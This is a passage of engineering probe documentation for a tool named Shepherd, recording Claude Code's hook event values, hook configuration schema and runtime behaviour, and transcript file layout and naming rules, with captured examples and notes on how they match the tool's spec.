**SessionStart.source** (binary enum): `startup` live (S01) · `resume` live (S02 `--resume`, S03 `--continue`) · `fork` live (S04 `--fork-session`) · `compact` live (S05 `/compact`) · `clear` live (S06, I01 `/clear`).

**SessionEnd.reason** (binary enum): `other` live (every `-p` exit) · `clear` live (S06, I01) · `prompt_input_exit` live (I01 `/exit`) · `logout` not verified (would sign out the real account) · `resume` not verified (TUI `/resume` switch not attempted).

**StopFailure.error** (binary enum `o_`, 13 values), with the stimulus that produced each observed value:

| error | assignments in binary | Observed | Stimulus |
|---|---|---|---|
| `authentication_failed` | 10 | yes | mock HTTP 401 `authentication_error`; mock HTTP 403 `permission_error` |
| `oauth_org_not_allowed` | 1 | no | needs a real org policy |
| `account_on_hold` | 1 | no | needs a real account state |
| `verification_required` | 1 | no | — |
| `billing_error` | 1 | yes | mock HTTP 400 "Your credit balance is too low…" |
| `rate_limit` | 10 | yes | mock HTTP 429 |
| `overloaded` | **0** | no | mock HTTP 529 produced `server_error` instead |
| `invalid_request` | 37 | yes | mock HTTP 400 "prompt is too long…" (with `error_details`) |
| `model_not_found` | 2 | yes | **real API** `--model claude-nonexistent-model-shp` (S07); mock HTTP 404 |
| `server_error` | 8 | yes | mock HTTP 500; mock HTTP 529 |
| `unknown` | 4 | yes | mock HTTP 400 `messages: field required` |
| `max_output_tokens` | 2 | yes | mock SSE `stop_reason:"max_tokens"` |
| `cloud_credential_error` | 1 | no | 3P cloud providers only |

**Notification.notification_type** — the binary list `VAr` (14 values): `permission_prompt` live (I01) · `idle_prompt` live (I01) · `auth_success` · `elicitation_dialog` · `agent_needs_input` · `agent_completed` · `elicitation_url_dialog` · `worker_permission_prompt` · `push_notification` · `computer_use_enter` · `computer_use_exit` · `quota_auto_resume_fired` · `quota_auto_resume_stale` · `quota_auto_resume_disabled`. Also emitted but **not** in `VAr`: `elicitation_response` live (S17), `elicitation_complete` (binary literal).

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| (enum values) | string | — | see lists above | mock-API results reflect Claude Code's own error mapping of a real HTTP status/body, not a real outage |

**Variants and edge cases:** the mock runs used an isolated `CLAUDE_CONFIG_DIR`, a fake `ANTHROPIC_API_KEY`, `CLAUDE_CODE_MAX_RETRIES=0`; with retries on, 429/529/5xx would be retried before StopFailure.

**Spec alignment:** see StopFailure (`overloaded` unreachable, plain 400 → `unknown`, two values missing), SessionEnd (`end_reason` → `reason`), SessionStart (`start_reason` → `source`), Notification (value set).

---

### Hooks config schema (`hooks` in settings.json)

- **Produced by:** Claude Code 2.1.270 settings validator (`Rd()`, `Rt`, `Gq`, `A6()`/`kzn()` in `docs/probes/2026-09-14-schemas/hooks/binary/settings-hook-config-schema.txt`)
- **Consumed by:** §8 "Hook installation" (lines 893–907); §15 install/uninstall with `_shepherd_managed` (lines 2230–2233); §6 `install_hooks()`/`uninstall_hooks()`; principle 4; M1, M6
- **Probe:** `run_probes.py R03 R04 R05 S13`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py R03 R04 R05`
- **Status:** partially verified — project, local and `--settings` scopes live 2026-09-14; user scope (`~/.claude/settings.json`) not tested (probe safety rule forbids editing it)

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/settings.json` [accepted], `docs/probes/2026-09-14-schemas/hooks/live/R03_config_pretooluse_broken/doctor.txt`, `docs/probes/2026-09-14-schemas/hooks/live/R03_config_stop_not_a_list/doctor.txt`)

```json
  "PreToolUse": [
   {
    "hooks": [
     {
      "type": "command",
      "command": "/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/capture_hook.sh PreToolUse /root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl",
      "timeout": 15,
      "_shepherd_managed": true
     },
     {
      "type": "command",
      "command": "/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/capture_env.py PreToolUse /root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/env.jsonl",
      "timeout": 15
     }
    ],
    "matcher": "*"
   }
  ]
```

```text
Invalid settings
- /tmp/shp-hooks-cfg-stop_not_a_list-hw_5z0an/.claude/settings.json › hooks.Stop: Hook event "Stop" must be an array of matchers; received string. This entry was ignored.
Invalid settings
- /tmp/shp-hooks-cfg-pretooluse_broken-dr33pv68/.claude/settings.json › hooks.PreToolUse.0.hooks.0: Invalid command hook (command: Invalid input) — a PreToolUse/PermissionRequest hook that cannot be loaded may be what guards the permissions declared beside it, so nothing it sits in is applied until the entry is fixed or removed.
- /tmp/shp-hooks-cfg-pretooluse_broken-dr33pv68/.claude/settings.json › hooks.PreToolUse.0.hooks.0.command: Expected string, but received undefined
  Suggested fix: Command hooks require command. For exec form (no shell), set command to the executable and args to its arguments: {"type": "command", "command": "echo", "args": ["hi"]}. For shell form, set command to the full shell string: {"type": "command", "command": "echo hi"}.
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `hooks` | object `{<EventName>: Group[]}` | — | | an array here disables every hook in the file (doctor: `"hooks" must be an object …`) |
| `Group.matcher` | string | optional | `"*"`, `"Bash"`, `"startup"` | omitted key accepted and matches all (R03 no_matcher_key fired); `"*"` accepted on events without matchers |
| `Group.hooks` | array of entries | required | | |
| `entry.type` | enum | required | `command` | also `prompt`, `agent`, `http`, `mcp_tool` |
| `entry.command` | string | required for `command` | shell string | runs via `/bin/sh -c` |
| `entry.args` | string[] | optional | not used | exec form, no shell |
| `entry.timeout` | positive number (seconds) | optional | `10`, `15`, `2` | `-5` → entry ignored; default 600 s (`Mp=600000`) |
| `entry.async` | bool | optional | `true` (R02) | runs in background |
| `entry.if`, `shell` (`bash`/`powershell`), `statusMessage`, `once`, `asyncRewake`, `rewakeMessage`, `rewakeSummary`, `cloud` | | optional | not used | schema only |
| `entry._shepherd_managed` (extra key) | any | — | `true` on every probe entry | accepted silently; hooks fired and `claude doctor` reported nothing (R03 extra_keys) |

**Variants and edge cases** (what `-p` did silently; what `claude doctor` then said):
- Invalid JSON in `settings.json`: the whole file ignored; `settings.local.json` next to it still loaded (`Expected object, but received undefined`).
- `hooks.Stop: "not-a-list"`: only that event dropped (`This entry was ignored.`); other hooks in the file fired.
- Unknown event `BogusEvent`: dropped, rest fired.
- Negative `timeout` / unknown `type`: that entry dropped (`entry ignored`), rest fired.
- **A broken `PreToolUse` or `PermissionRequest` entry disables every hook in that file** (doctor: "nothing it sits in is applied until the entry is fixed or removed"; the file's valid UserPromptSubmit probe did not fire, `docs/probes/2026-09-14-schemas/hooks/live/R03_config_pretooluse_broken/events.jsonl`).
- Hooks given only through `--settings <file>` load and fire (R04).
- No validation message appears in `-p` stderr or the debug log for any of these; only `claude doctor` shows them.

**Spec alignment:**
- spec lines 2231–2232 (`"_shepherd_managed": true` on each entry): accepted in project/local/`--settings` scope (R03 extra_keys, all S* runs). Not tested in user scope.
- spec line 2230 (merge into `~/.claude/settings.json`): a user's own malformed PreToolUse/PermissionRequest entry in that file silently disables Shepherd's hooks too (R03 pretooluse_broken); install should validate the merged file with `claude doctor` or the same rules.
- spec line 893 ("one dispatcher, all events"): not a mismatch. The subscribed list (lines 912–923) leaves out WorktreeCreate, and registering it would break `--worktree` (see WorktreeCreate).

---

### Hook runtime contract (process, stdin, env, exit codes, stdout, timeout, sync, ancestry)

- **Produced by:** Claude Code 2.1.270 hook runner (`VE()`, `rS()`, `fet()` in `docs/probes/2026-09-14-schemas/hooks/binary/runtime-source-snippets.txt`)
- **Consumed by:** §8 `hookd.py` (lines 895–909: 250 ms UDS, always exit 0); §5.0 (line 312, 0600 socket); principle 4 (line 163); D37; §18 volume risk; M1
- **Probe:** `run_probes.py S01 S07 R01 R02` (+ `docs/probes/2026-09-14-schemas/hooks/capture_env.py`). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S07 R01 R02`
- **Status:** partially verified — ancestry, stdin, env, exit 0/1/2, per-entry timeout, blocking and `async` are live 2026-09-14. From the binary only: the 600 s default timeout (`Mp=600000`; the debug line shows it only for an async hook) and the interactive trust skip. The kill-at-exit cause is inferred (see StopFailure). Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/env.jsonl` [SessionStart env], `docs/probes/2026-09-14-schemas/hooks/live/R01_exit_codes/stdout.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/R02_timeout_sync/stdout.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/R02_timeout_sync/timing.txt`, `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl` [ancestry])

```json
"_env": {..., "CLAUDECODE": "1", "CLAUDE_CODE_CHILD_SESSION": "1", "CLAUDE_CODE_ENTRYPOINT": "sdk-cli", "CLAUDE_CODE_MESSAGING_SOCKET": "/run/user/0/cc-socks/4033475.sock", "CLAUDE_CODE_MESSAGING_TOKEN": "<redacted>", "CLAUDE_CODE_SESSION_ATTENDED": "0", "CLAUDE_CODE_SESSION_ID": "8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6", "CLAUDE_ENV_FILE": "/root/.claude/session-env/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6/sessionstart-hook-1.sh", "CLAUDE_PID": "4033475", "CLAUDE_PROJECT_DIR": "/tmp/shp-hooks-base-dwqg6d95", "COREPACK_ENABLE_AUTO_PIN": "0", ..., "GIT_EDITOR": "true", "HOME": "/root", "LANG": "en_US.UTF-8", ..., "NoDefaultCurrentDirectoryInExePath": "1", "OLDPWD": "/root/Shepherd", "PATH": "/root/.local/bin:/root/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/root/src/cc10x-qa/plugins/cc10x/bin", "PWD": "/tmp/shp-hooks-base-dwqg6d95", "SHELL": "/bin/bash", "SHLVL": "4", "SHP_CLAUDE_VERSION": "2.1.270 (Claude Code)", ..., "TERM": "tmux-256color", ..., "TMUX": "/tmp/tmux-0/shepherd,3971391,0", ..., "USER": "root", ..., "_": "/usr/bin/python3"}
"_hook_pid":4033513,"_claude_pid":4033475,"_ancestry":[{"pid":4033513,"comm":"capture_hook.sh","ppid":4033512},{"pid":4033512,"comm":"sh","ppid":4033475},{"pid":4033475,"comm":"claude","ppid":4033472},{"pid":4033472,"comm":"python3","ppid":4033470},{"pid":4033470,"comm":"bash","ppid":3971404},{"pid":3971404,"comm":"claude","ppid":3971392},{"pid":3971392,"comm":"bash","ppid":3971391},{"pid":3971391,"comm":"tmux: server","ppid":1}]
{"type":"system","subtype":"hook_response","hook_id":"88858f1a-4a57-4948-8418-9b130b369003","hook_name":"PreToolUse:Bash","hook_event":"PreToolUse","output":"SHP_BLOCKED_BY_HOOK exit 2\n","stdout":"","stderr":"SHP_BLOCKED_BY_HOOK exit 2\n","exit_code":2,"outcome":"error","uuid":"0e25c67b-b9fb-456f-9df0-2e0527235c95","session_id":"471c725e-934f-485e-add0-50f63754a7e6"}
{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"PreToolUse:Bash hook error: [/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/R01_exit_codes/block_exit2.sh]: SHP_BLOCKED_BY_HOOK exit 2\n","is_error":true,"tool_use_id":"toolu_01D9Fit8sZFzwP8RgixeqGtw"}]},"parent_tool_use_id":null,"session_id":"471c725e-934f-485e-add0-50f63754a7e6","uuid":"b2e010ce-7e8d-4956-a0ee-37df0e6cf55b","timestamp":"2026-09-14T15:25:50.876Z","tool_use_result":"Error: PreToolUse:Bash hook error: [/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/R01_exit_codes/block_exit2.sh]: SHP_BLOCKED_BY_HOOK exit 2\n","tool_result_meta":[{"id":"toolu_01D9Fit8sZFzwP8RgixeqGtw","non_execution_kind":"permission-rule"}]}
{"type":"system","subtype":"hook_response","hook_id":"40960f32-da12-404f-9f10-858d4620003b","hook_name":"PreToolUse:Bash","hook_event":"PreToolUse","output":"","stdout":"","stderr":"","exit_code":1,"outcome":"cancelled","uuid":"50fd3eb4-5a8e-4876-90f7-088b7ef698b8","session_id":"2816eb1e-ca74-41c1-87ec-35feadc38c89"}
```

```text
ups_async_sleep5 start 15:25:58.155 pid=4037616
pre_timeout2_sleep8 start 15:25:59.665 pid=4037627
post_sleep3 start 15:26:01.772 pid=4037682
ups_async_sleep5 end 15:26:03.160
post_sleep3 end 15:26:04.774
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| process | — | always | `claude` → `/bin/sh -c <command>` (dash) → hook | 429/429 captures: parent `sh`, grandparent `claude`. Owning pid = first ancestor with comm `claude` = `$CLAUDE_PID` |
| stdin | bytes | always | payload JSON + `\n`, then EOF; not a tty | open fds 0,1,2 (plus the probe's own directory-listing fd) |
| hook cwd | path | always | session `cwd` | |
| `CLAUDE_PID` | env | always (every env capture: SessionStart, UserPromptSubmit, PreToolUse, Stop, SessionEnd in S01; PreToolUse, Stop in S10) | owning claude pid | |
| `CLAUDE_CODE_SESSION_ID` | env | always | = payload `session_id` | |
| `CLAUDE_PROJECT_DIR` | env | always | launch dir | |
| `CLAUDECODE`, `CLAUDE_CODE_ENTRYPOINT`, `CLAUDE_CODE_SESSION_ATTENDED`, `CLAUDE_CODE_CHILD_SESSION` | env | always | `1`, `sdk-cli` (`-p`), `0`, `1` | |
| `CLAUDE_CODE_MESSAGING_SOCKET` / `_TOKEN` | env | sometimes | not on SessionEnd | token value `<redacted>` |
| `CLAUDE_ENV_FILE` | env | SessionStart only | `~/.claude/session-env/<sid>/sessionstart-hook-1.sh` | |
| `CLAUDE_EFFORT` | env | when effort applies | `low` (S10 PreToolUse/Stop) | absent for haiku |
| exit 0 | — | — | success; stdout parsed as JSON if it starts with `{`, else plain text (UserPromptSubmit stdout became model context) | |
| exit 2 | — | — | PreToolUse: call blocked, stderr sent to the model as `tool_result` `is_error:true`, `outcome:"error"` | |
| exit 1 | — | — | non-blocking error (`Stop` exit 1 → `outcome:"error"`, session finished normally) | |
| timeout | seconds | per entry | `timeout: 2` on an 8 s sleep → killed at ~2.1 s (`end` line never written), `exit_code:1`, `outcome:"cancelled"`, tool then ran | default 600 s |
| synchronicity | — | — | blocking: a 3 s PostToolUse hook delayed the next event (PostToolBatch) by 3.0 s; hooks for one event start in parallel (capture and slow hook started 4 ms apart) | `async:true` → backgrounded (debug `Registering async hook … with timeout 600000ms`) |

**Variants and edge cases:**
- **`-p` shutdown kills slow hooks.** A StopFailure hook still running when the CLI exits appears to be killed: the Python capture was lost and the fork-free bash capture kept, 2/2 (`docs/probes/2026-09-14-schemas/hooks/live/S07_bad_model/debug-hooklines.txt`, `docs/probes/2026-09-14-schemas/hooks/live/R04_settings_flag/debug-hooklines.txt`). Audit: this was not observed for SessionEnd, where the Python hook in S01 completed with status 0.
- Hooks run in never-trusted directories under `-p`; the binary skips all hooks when workspace trust is not accepted in interactive mode (`Skipping … hook execution - workspace trust not accepted`, `docs/probes/2026-09-14-schemas/hooks/binary/runtime-source-snippets.txt` line 12).
- `--include-hook-events` with `--output-format stream-json` emits `hook_started`/`hook_response` system messages (hook name, exit code, stdout, stderr, outcome) — an alternative signal path for `owned` sessions.
- The environment is inherited from the launching process (here `TMUX`, `TERM`, a plugin `PATH` entry leaked from the parent).

**Spec alignment:**
- spec lines 897–907 (`hookd.py` reads stdin, 250 ms UDS write, always exit 0): contract aligned (exit 0 is non-blocking, stdin closes). Timing risk: a Python `hookd` of the shape shown (interpreter start + UDS connect) is exactly what was lost on `-p` StopFailure in S07 and R04. The StopFailure path needs a hook that finishes in a few ms, or a fallback on process exit. Without one, S07 (exit 1, StopFailure lost) would classify as `crashed` (line 964) instead of `bad_request`.
- spec line 163 ("Hooks time out"): the per-entry `timeout` is enforced by Claude Code (R02) — Shepherd's install should set it, since the default is 600 s of blocking.
- Owning-pid discovery: `$CLAUDE_PID` in the hook env equals the `claude` parent of the hook's `sh` (S01 env vs ancestry) — no `/proc` walk needed.

## Claude Code transcripts and on-disk session state

**Surface:** `transcripts`. **Source:** `docs/probes/2026-09-14-schemas/transcripts/SECTION.md`. Paths that do not start with `docs/` or `/` are relative to `docs/probes/2026-09-14-schemas/transcripts/` (or to the capture folder named in the same caption).

Surface: the files Claude Code writes under `~/.claude/projects/`, the live-session registry under
`~/.claude/sessions/`, `~/.claude.json` project entries, and `claude agents --json`.

All live runs used `claude --version` = `2.1.270 (Claude Code)`, model `claude-haiku-4-5-20251001`,
throwaway working directories from `mktemp -d /tmp/shp-schemas-*`, and a timeout on every run. Each
throwaway directory had `.claude/settings.json` with `"enabledPlugins": {"cc10x@cc10x": false}`.
**No cc10x hook fired in any throwaway session.** Every `stop_hook_summary` in this surface's own throwaways shows `hookCount: 1`, which is the
probe's own Stop hook. The one copied sibling session (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-hooks-effort-7yb7myuc/…`) shows `hookCount: 2`, and both entries are the sibling hooks probe's own capture scripts. The copied transcripts contain no `hook_*`
attachments and no mention of cc10x.

Audit note (2026-09-14): every example below was traced to its source line in `docs/probes/2026-09-14-schemas/transcripts/captures/` or `docs/probes/2026-09-14-schemas/transcripts/copies/`, and all of them match byte-for-byte apart from the `...` trims. Counts marked "probe dirs" come from `docs/probes/2026-09-14-schemas/transcripts/captures/real-transcripts-stats.json`, which was regenerated at 15:35:39Z. Sibling probes kept writing `-tmp-shp-*` dirs, so the probe-dir counts in this file are the ones in that snapshot. User-data counts did not drift.

Evidence folder: `docs/probes/2026-09-14-schemas/transcripts/`
- `docs/probes/2026-09-14-schemas/transcripts/captures/` holds raw outputs. Every run has a `*-meta.txt` that records `claude --version`, the argv and the exit code.
- `docs/probes/2026-09-14-schemas/transcripts/copies/<project-dir>/` holds copies of the throwaway transcripts and sidecars, byte-for-byte except for the privacy pass below.
- **Privacy pass** (`docs/probes/2026-09-14-schemas/transcripts/redact_copies.py`): Claude Code writes the account email into every session, in the
  `session_context` attachment. It also writes account and organization UUIDs into `bridge-session` entries.
  Both were replaced in place with `<redacted-email>` and `<redacted-uuid>`. The user's own transcripts were
  only **counted** (`docs/probes/2026-09-14-schemas/transcripts/stats_real_transcripts.py`). No content from them appears here.

Re-run everything (about $0.60 of haiku usage, about 12 minutes including the binary grep):
```
cd /root/Shepherd && P=docs/probes/2026-09-14-schemas/transcripts && bash $P/probe_lifecycle.sh && bash $P/probe_slug.sh \
 && bash $P/probe_registry.sh && bash $P/probe_registry_interactive.sh && bash $P/probe_fork_live.sh \
 && python3 $P/probe_claude_json.py > $P/captures/claude-json-shape.txt \
 && python3 $P/stats_real_transcripts.py > $P/captures/real-transcripts-stats.json && python3 $P/stats_registry.py > $P/captures/registry-stats.json && date -u +%FT%TZ > $P/captures/real-transcripts-stats.generated_at.txt && bash $P/probe_binary_metadata.sh
```
Helpers: `docs/probes/2026-09-14-schemas/transcripts/outline.py` prints a one-line-per-entry outline of a transcript. `excerpt.py FILE N MAX` prints raw line N with long strings cut and marked `...`. Every example below was produced with `docs/probes/2026-09-14-schemas/transcripts/excerpt.py` or copied from a capture file.

---

### Project directory layout (`~/.claude/projects/<slug>/`)

- **Produced by:** Claude Code 2.1.270 (all entrypoints: `cli` and `sdk-cli`/`-p`)
- **Consumed by:** §6 `EngineAdapter.locate_transcript` (line 436), §6 engine matrix (line 549), §7 "subagent rows … read from the transcript on demand" (line 609), §12 Fleet subagent lines (line 1870), D24, M1 (workspace→session→subagent tree)
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh` (steps `main bg workflow`). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main bg workflow`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/captures/layout-listing.txt`)
```text
claude_version: 2.1.270 (Claude Code)
# find ~/.claude/projects/-tmp-shp-schemas-tx-blIf90-work (throwaway probe project dir)
d     4096 ./0141fab3-8bf8-4b69-be1f-89552ccfce5d
f   211715 ./0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl
d     4096 ./0141fab3-8bf8-4b69-be1f-89552ccfce5d/subagents
f    87274 ./0141fab3-8bf8-4b69-be1f-89552ccfce5d/subagents/agent-a4388d337bf8a9397.jsonl
f      176 ./0141fab3-8bf8-4b69-be1f-89552ccfce5d/subagents/agent-a4388d337bf8a9397.meta.json
...
f    75012 ./518c280f-3791-4571-ae9a-f002c8f3b33c/subagents/workflows/wf_edb19b07-a69/agent-aff491fda998b3fe0.jsonl
f      149 ./518c280f-3791-4571-ae9a-f002c8f3b33c/subagents/workflows/wf_edb19b07-a69/agent-aff491fda998b3fe0.meta.json
f      315 ./518c280f-3791-4571-ae9a-f002c8f3b33c/subagents/workflows/wf_edb19b07-a69/journal.jsonl
f      205 ./518c280f-3791-4571-ae9a-f002c8f3b33c/workflows/scripts/shp-probe-wf-wf_edb19b07-a69.js
f     1211 ./518c280f-3791-4571-ae9a-f002c8f3b33c/workflows/wf_edb19b07-a69.json
...
d     4096 ./memory
# find /tmp/claude-0/-tmp-shp-schemas-tx-blIf90-work (per-session task output dir)
l ./0141fab3-8bf8-4b69-be1f-89552ccfce5d/tasks/a4388d337bf8a9397.output -> /root/.claude/projects/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d/subagents/agent-a4388d337bf8a9397.jsonl
f ./518c280f-3791-4571-ae9a-f002c8f3b33c/tasks/w1x94eiqe.output ->
```

| Path (relative to `~/.claude/projects/<slug>/`) | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `<sessionId>.jsonl` | JSONL file | always (every persisted session) | 83 in probe dirs, 14 in user dirs | Main transcript. File name = session UUID |
| `<sessionId>/subagents/agent-<agentId>.jsonl` | JSONL | sometimes (Agent tool used) | 6 probe, 9 user | `agentId` = 17 hex chars. Nested agents (spawnDepth 2) are stored flat in the same folder (user data: `parentAgentId` present 3×) |
| `<sessionId>/subagents/agent-<agentId>.meta.json` | JSON | always next to each agent jsonl | 6 probe, 9 user (plus 1 probe and 17 user under `workflows/wf_*/`) | See "Subagent .meta.json" |
| `<sessionId>/subagents/workflows/wf_<runId>/agent-<agentId>.{jsonl,meta.json}` | JSONL + JSON | sometimes (Workflow tool used) | 1 probe run, 2 user runs | `runId` is the pattern `wf_[0-9a-f]{8}-[0-9a-f]{3}` |
| `<sessionId>/subagents/workflows/wf_<runId>/journal.jsonl` | JSONL | always per workflow run | 1 probe, 2 user | See "Workflow journal" |
| `<sessionId>/workflows/wf_<runId>.json` | JSON | sometimes (after a run completes) | 1 probe, 1 user (2 runs, 1 file: the running workflow has none yet) | Run summary |
| `<sessionId>/workflows/scripts/<name>-wf_<runId>.js` | JS | always per workflow run | 1 probe, 2 user | Persisted script |
| `<sessionId>/custom-title.json` | JSON | sometimes | 0 probe, 1 user | `{"customTitle": <str>}`. Seen only next to a session renamed with `/rename` (the tmux surface covers /rename) |
| `<sessionId>/tool-results/*.txt` | text | sometimes | 0 probe, 19 files in 3 user sessions | Large tool outputs spilled to disk |
| `memory/` (per project dir) | dir | always created (empty in probes) | user: 4 `*.md` | Auto-memory, not per session |
| `/tmp/claude-<uid>/<slug>/<sessionId>/tasks/<taskId>.output` | symlink or file | sometimes (background agent/workflow) | symlink → agent jsonl; plain file for workflows | Outside `~/.claude`. `<uid>` = `0` here |

**Variants and edge cases:**
- A compaction ran an internal subagent. Its `SubagentStop.agent_transcript_path` (`.../subagents/agent-a4e465b8cdd4fb220.jsonl`) **did not exist** afterwards (`docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl`). Do not assume every SubagentStop path exists.
- Only the Agent tool writes a `toolUseId` in meta. Workflow agents do not (see below).
- The D24 glob `~/.claude/projects/*.jsonl`, taken literally, matches **no** files: main transcripts sit one directory down, at `projects/<slug>/<sessionId>.jsonl`. The auditor's re-run found 0 matches. Subagent transcripts are deeper still (`<slug>/<sid>/subagents/agent-*.jsonl` and `<slug>/<sid>/subagents/workflows/wf_*/agent-*.jsonl`), so even `projects/*/*.jsonl` misses them.

**Spec alignment:** aligned for the main transcript location (line 549). The spec says nothing about the nested `subagents/workflows/wf_*/` tree or the `/tmp/claude-<uid>` task-output tree. Line 609 and line 1870 need both trees (see the subagent and workflow sections).

### Project directory slug rule

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §6 `locate_transcript` (line 436), D22 cwd→repo binding (only if a path is derived from cwd), M1
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_slug.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_slug.sh`
- **Status:** verified live 2026-09-14 (9 cwds. The derived rule matched 9 of 9)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/captures/slug-results.jsonl`)
```json
{"derived_rule": "-tmp-shp-schemas-slug-6V4NfF-wwwwwwww...wwwwwwww-vg1k1m", "derived_equals_real": true, "claude_version": "2.1.270 (Claude Code)", "session_id": "2f6ceb71-54d8-48af-a925-5be3e19418a3", "cwd": "/tmp/shp-schemas-slug.6V4NfF/wwwwwwww...wwwwwwww", "cwd_chars": 201, "cwd_utf8_bytes": 201, "real_dir": "-tmp-shp-schemas-slug-6V4NfF-wwwwwwww...wwwwwwww-vg1k1m", "real_len": 207, ... "naive_len": 201, "naive_equals_real": false, ...}
{"derived_rule": "-tmp-shp-schemas-slug-6V4NfF-emoji----x", "derived_equals_real": true, "claude_version": "2.1.270 (Claude Code)", "session_id": "f8b76831-d92e-49ae-8427-54b430af8cd6", "cwd": "/tmp/shp-schemas-slug.6V4NfF/emoji-😀-x", "cwd_chars": 38, "cwd_utf8_bytes": 41, "real_dir": "-tmp-shp-schemas-slug-6V4NfF-emoji----x", "real_len": 39, "naive_rule": "-tmp-shp-schemas-slug-6V4NfF-emoji---x", "naive_len": 38, "naive_equals_real": false, "transcript_cwd_field": "/tmp/shp-schemas-slug.6V4NfF/emoji-😀-x"}
{"derived_rule": "-tmp-shp-schemas-slug-6V4NfF--n-c-d----", "derived_equals_real": true, "claude_version": "2.1.270 (Claude Code)", "session_id": "822dae80-45e1-4e67-896d-3afe66b42822", "cwd": "/tmp/shp-schemas-slug.6V4NfF/ünïcødé-日本", "cwd_chars": 39, "cwd_utf8_bytes": 47, "real_dir": "-tmp-shp-schemas-slug-6V4NfF--n-c-d----", "real_len": 39, "naive_rule": "-tmp-shp-schemas-slug-6V4NfF--n-c-d----", "naive_len": 39, "naive_equals_real": true, "transcript_cwd_field": "/tmp/shp-schemas-slug.6V4NfF/ünïcødé-日本"}
```

**The rule, derived from these captures:**
```
s = cwd with every UTF-16 code unit outside [A-Za-z0-9] replaced by "-"
slug = s                                        if len(s) <= 200
slug = s[:200] + "-" + base36(abs(javaStringHash(cwd)))   otherwise
```
Here `javaStringHash` is `h = 31*h + codeUnit` in signed 32-bit arithmetic over the UTF-16 code units of the raw cwd, and `base36` uses the alphabet `0-9a-z`.

| Input case | cwd chars | Real dir length | Naive rule equal? | Derived rule equal? |
|---|---|---|---|---|
| `dots.and_under_scores` | 50 | 50 | yes | yes |
| `with space` | 39 | 39 | yes | yes |
| `ünïcødé-日本` (BMP non-ASCII) | 39 | 39 | yes (one `-` per char) | yes |
| `a--b..c` | 36 | 36 | yes (runs of `-` are not collapsed) | yes |
| `UPPER.Case-9` | 41 | 41 | yes (case kept) | yes |
| exactly 200 chars | 200 | 200 | yes | yes |
| 201 chars | 201 | 207 | **no** | yes (`-vg1k1m`) |
| 265 chars, two long components | 265 | 207 | **no** | yes (`-b9qyzo`) |
| `emoji-😀-x` (astral) | 38 | 39 | **no** (emoji becomes 2 dashes) | yes |

**Variants and edge cases:**
- The slug is lossy (`a.b` and `a_b` both become `a-b`). Two cwds can share one project dir. Always read `cwd` from the entries; do not reverse the slug.
- The hash suffix has variable length (6 chars in both captures; base36 of a 31-bit value is at most 6 chars).
- The transcript's `cwd` field keeps the raw path, including Unicode and spaces.

**Spec alignment:** aligned. The spec never states a slug rule; `locate_transcript(engine_session_id)` can glob `~/.claude/projects/*/<id>.jsonl` and never needs one. If a plan derives the directory from cwd, the naive rule is wrong for cwds over 200 UTF-16 units and for astral characters (`docs/probes/2026-09-14-schemas/transcripts/captures/slug-results.jsonl`).

### Transcript entry: common envelope

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §6 `parse_transcript_delta` (line 437), §8 transcript-tail classifier (line 1022), D24, M1/M2
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` line 3, 0-based)
```json
{"parentUuid":null,"isSidechain":false,"promptId":"b842cda1-7298-40d9-87a4-1966249ed00c","type":"user","message":{"role":"user","content":"Step 1: use the Agent tool (subagent_type general-purpose, description..."},"uuid":"32b48930-be22-4ea9-ab0f-16c5ed2796e8","timestamp":"2026-09-14T15:07:08.158Z","permissionMode":"default","promptSource":"sdk","userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD"}
```

Two families of entries exist:
1. **Conversation entries** (`user`, `assistant`, `attachment`, `system`) carry the full envelope below.
